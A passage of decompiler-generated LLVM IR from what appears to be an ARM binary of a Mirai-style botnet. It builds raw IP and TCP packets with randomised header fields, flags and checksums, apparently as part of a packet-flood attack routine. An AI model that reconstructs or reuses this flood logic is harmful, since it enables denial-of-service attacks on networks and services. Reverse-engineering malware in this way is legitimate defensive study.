  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, 65280
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v5_a4b8 = call i32 @llvm.bswap.i32(i32 %v0_a49c)
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v1_a508 = and i32 %v3_a4fc, 65280
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v5_a520 = call i32 @llvm.bswap.i32(i32 %v3_a4fc)
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v5_a544 = call i32 @llvm.bswap.i32(i32 %v3_a528)
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp101 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp101 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp77, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0, %bb78
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp102 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp102 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp82, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp84, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp85 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp86, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp103
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
